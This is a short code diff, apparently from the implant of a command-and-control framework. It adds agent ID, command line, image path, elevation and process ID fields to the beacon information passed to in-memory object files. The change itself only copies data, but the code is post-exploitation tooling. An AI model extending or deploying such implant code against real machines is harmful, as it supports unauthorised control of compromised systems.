@@ -703,6 +703,12 @@ auto Coff::Information( BEACON_INFO* info ) -> BOOL {
 
     info->BeaconPtr    = (PBYTE)Self->Session.Base.Start;
     info->BeaconLength = Self->Session.Base.Length;
+    
+    info->Session.AgentId       = Self->Session.AgentID;
+    info->Session.CommandLine   = Self->Session.CommandLine;
+    info->Session.ImagePath     = Self->Session.ImagePath;
+    info->Session.Elevated      = Self->Session.Elevated;
+    info->Session.ProcessId     = Self->Session.ProcessID;
 
     info->HeapRecords.EntryCount = Self->Hp->Count;
     info->HeapRecords.NodeHead   = Self->Hp->Node;
